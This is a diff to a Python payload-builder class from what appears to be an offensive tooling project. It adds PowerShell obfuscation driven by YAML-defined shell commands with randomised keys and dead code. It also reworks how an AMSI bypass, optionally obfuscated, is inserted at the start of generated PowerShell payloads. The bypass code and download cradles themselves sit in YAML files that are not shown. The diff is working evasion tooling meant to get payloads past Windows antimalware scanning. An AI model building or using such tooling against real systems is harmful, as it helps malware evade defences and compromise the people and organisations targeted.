@@ -7,6 +7,10 @@ template rendering, and compilation.
 
 import subprocess
 import json
+import yaml
+import random
+import tempfile
+import os
 from pathlib import Path
 from typing import Dict, List, Tuple, Optional, Callable
 from jinja2 import Template, Environment
@@ -64,6 +68,135 @@ class PayloadBuilder:
         self.build_options = build_options or {}
         self.remove_comments = self.build_options.get('remove_comments', config.remove_comments)
         self.strip_binaries = self.build_options.get('strip_binaries', config.strip_binaries)
+        
+        # Load PowerShell obfuscation methods and features
+        self.ps_obfuscation_methods = self._load_ps_obfuscation_methods()
+        self.ps_features = self._load_ps_features()
+    
+    def _load_ps_obfuscation_methods(self) -> List[dict]:
+        """Load PowerShell obfuscation methods from YAML"""
+        try:
+            yaml_path = self.config.ps_obfuscation_yaml
+            if yaml_path.exists():
+                with open(yaml_path, 'r') as f:
+                    return yaml.safe_load(f) or []
+        except Exception as e:
+            print(f"Warning: Failed to load ps-obfuscation.yaml: {e}")
+        return []
+    
+    def _load_ps_features(self) -> List[dict]:
+        """Load PowerShell features (AMSI, cradles) from YAML"""
+        try:
+            yaml_path = self.config.ps_features_yaml
+            if yaml_path.exists():
+                with open(yaml_path, 'r') as f:
+                    return yaml.safe_load(f) or []
+        except Exception as e:
+            print(f"Warning: Failed to load ps-features.yaml: {e}")
+        return []
+    
+    def _get_feature_by_name(self, name: str, feature_type: str = None) -> Optional[dict]:
+        """Get a feature from ps_features by name and optionally type"""
+        for feature in self.ps_features:
+            if feature.get('name') == name:
+                if feature_type is None or feature.get('type') == feature_type:
+                    return feature
+        return None
+    
+    def _get_obfuscation_method_by_name(self, name: str) -> Optional[dict]:
+        """Get an obfuscation method from ps_obfuscation_methods by name"""
+        for method in self.ps_obfuscation_methods:
+            if method.get('name') == name:
+                return method
+        return None
+    
+    def _apply_ps_obfuscation(self, code: str, method_name: str) -> Tuple[bool, str, str]:
+        """Apply PowerShell obfuscation using a method from ps-obfuscation.yaml
+        
+        Args:
+            code: PowerShell code to obfuscate
+            method_name: Name of the obfuscation method
+            
+        Returns:
+            Tuple of (success: bool, obfuscated_code: str, command_used: str)
+        """
+        method = self._get_obfuscation_method_by_name(method_name)
+        if not method:
+            return False, code, ''
+        
+        command_template = method.get('command', '')
+        if not command_template:
+            return False, code, ''
+        
+        # Create temporary files
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.ps1', delete=False) as tmp_in:
+            tmp_in.write(code)
+            tmp_in_path = tmp_in.name
+        
+        tmp_out_path = tmp_in_path.replace('.ps1', '_obf.ps1')
+        
+        try:
+            # Generate random values for command template
+            rand_hex_bytes = random.randint(8, 32)
+            rand_hex_length = rand_hex_bytes * 2
+            rand_hex = ''.join(random.choices('0123456789abcdef', k=rand_hex_length))
+            rand_stringdict = random.randint(0, 100)
+            rand_deadcode = random.randint(0, 100)
+            rand_seed = random.randint(0, 10000)
+            
+            # Format command with variables
+            command = command_template.format(
+                temp=tmp_in_path,
+                out=tmp_out_path,
+                hex_key=rand_hex,
+                string_dict=rand_stringdict,
+                dead_code=rand_deadcode,
+                seed=rand_seed
+            )
+            
+            # Execute obfuscation
+            result = subprocess.run(
+                command,
+                shell=True,
+                capture_output=True,
+                text=True,
+                timeout=120
+            )
+            
+            # Check if successful
+            if result.returncode == 0 and os.path.exists(tmp_out_path):
+                with open(tmp_out_path, 'r') as f:
+                    obfuscated_code = f.read().strip()
+                
+                # Clean up temp files
+                try:
+                    os.unlink(tmp_in_path)
+                    os.unlink(tmp_out_path)
+                except:
+                    pass
+                
+                return True, obfuscated_code, command
+            else:
+                # Clean up and return original
+                try:
+                    os.unlink(tmp_in_path)
+                    if os.path.exists(tmp_out_path):
+                        os.unlink(tmp_out_path)
+                except:
+                    pass
+                
+                return False, code, ''
+        
+        except Exception as e:
+            # Clean up and return original
+            try:
+                os.unlink(tmp_in_path)
+                if os.path.exists(tmp_out_path):
+                    os.unlink(tmp_out_path)
+            except:
+                pass
+            
+            return False, code, ''
     
     def set_progress_callback(self, callback: Callable[[BuildStep], None]):
         """
@@ -361,17 +494,23 @@ class PayloadBuilder:
                 self.build_options.get('ps_amsi_bypass', False)):
                 
                 amsi_method = self.build_options.get('ps_amsi_method', '')
+                amsi_obf_method = self.build_options.get('ps_amsi_obf_method', '')
                 if amsi_method:
-                    amsi_step = BuildStep(f"Inserting AMSI bypass ({amsi_method})", "amsi_bypass")
+                    amsi_step_name = f"Inserting AMSI bypass ({amsi_method})"
+                    if amsi_obf_method:
+                        amsi_step_name += f" with obfuscation ({amsi_obf_method})"
+                    amsi_step = BuildStep(amsi_step_name, "amsi_bypass")
                     self.steps.append(amsi_step)
                     amsi_step.status = "running"
                     self._update_step(amsi_step)
                     
-                    success = self._insert_amsi_bypass_template(source_file, amsi_method)
+                    success, command_used = self._insert_amsi_bypass_template(source_file, amsi_method, amsi_obf_method)
                     
                     if success:
                         amsi_step.status = "success"
                         amsi_step.output = f"AMSI bypass '{amsi_method}' inserted at beginning of script"
+                        if command_used:
+                            amsi_step.output += f"\n\nCommand: {command_used}"
                         self._update_step(amsi_step)
                     else:
                         amsi_step.status = "failed"
@@ -382,18 +521,34 @@ class PayloadBuilder:
             if (full_template_path.suffix.lower() == '.ps1' and 
                 self.build_options.get('ps_obfuscate', False)):
                 
-                obf_level = self.build_options.get('ps_obfuscate_level', 'high')
-                obf_success, obf_file = self._obfuscate_powershell(
-                    source_file, 
-                    output_path, 
-                    output_file,
-                    obf_level
-                )
-                
-                if obf_success:
-                    # Update source_file to point to the obfuscated version
-                    source_file = Path(obf_file)
-                # If obfuscation fails, continue with non-obfuscated version
+                obf_method = self.build_options.get('ps_obfuscate_level', '')
+                if obf_method:
+                    obf_step = BuildStep(f"Obfuscating PowerShell ({obf_method})", "obfuscation")
+                    self.steps.append(obf_step)
+                    obf_step.status = "running"
+                    self._update_step(obf_step)
+                    
+                    # Read source file
+                    with open(source_file, 'r') as f:
+                        ps_code = f.read()
+                    
+                    success, obfuscated, command_used = self._apply_ps_obfuscation(ps_code, obf_method)
+                    
+                    if success:
+                        # Write obfuscated code back to source file
+                        with open(source_file, 'w') as f:
+                            f.write(obfuscated)
+                        
+                        obf_step.status = "success"
+                        output_msg = f"PowerShell obfuscation successful ({obf_method})"
+                        if command_used:
+                            output_msg += f"\n\nCommand: {command_used}"
+                        obf_step.output = output_msg
+                        self._update_step(obf_step)
+                    else:
+                        obf_step.status = "failed"
+                        obf_step.error = f"PowerShell obfuscation failed, continuing with non-obfuscated script"
+                        self._update_step(obf_step)
             
             # Step: C# name obfuscation if enabled (BEFORE compilation)
             if (full_template_path.suffix.lower() == '.cs' and 
@@ -839,26 +994,32 @@ class PayloadBuilder:
         
         return True, str(final_file)
     
-    def _insert_amsi_bypass_template(self, ps1_file: Path, bypass_method: str) -> bool:
+    def _insert_amsi_bypass_template(self, ps1_file: Path, bypass_method: str, obf_method: str = '') -> Tuple[bool, str]:
         """Insert AMSI bypass at the beginning of a PowerShell template
         
         Args:
             ps1_file: Path to the PowerShell file
             bypass_method: Name of the bypass method to use
+            obf_method: Optional name of obfuscation method to apply to bypass
             
         Returns:
             True if successful, False otherwise
         """
         try:
-            # Load bypass code
-            amsi_dir = self.config.templates_dir / 'amsi_bypasses'
-            bypass_file = amsi_dir / f"{bypass_method.replace(' ', '_')}.ps1"
+            # Load bypass code from ps-features.yaml
+            bypass_feature = self._get_feature_by_name(bypass_method, 'amsi')
+            if not bypass_feature or 'code' not in bypass_feature:
+                return False, ''
             
-            if not bypass_file.exists():
-                return False
+            bypass_code = bypass_feature.get('code', '').strip()
+            command_used = ''
             
-            with open(bypass_file, 'r') as f:
-                bypass_code = f.read().strip()
+            # Apply obfuscation to bypass code if requested and allowed
+            if obf_method and not bypass_feature.get('no-obf', False):
+                success, obfuscated, command = self._apply_ps_obfuscation(bypass_code, obf_method)
+                if success:
+                    bypass_code = obfuscated
+                    command_used = command
             
             # Read existing file
             with open(ps1_file, 'r') as f:
@@ -871,10 +1032,10 @@ class PayloadBuilder:
             with open(ps1_file, 'w') as f:
                 f.write(modified_code)
             
-            return True
+            return True, command_used
             
         except Exception as e:
-            return False
+            return False, ''
     
     def _obfuscate_csharp_names(self, cs_file: Path) -> tuple:
         """Obfuscate C# function and variable names with innocuous identifiers
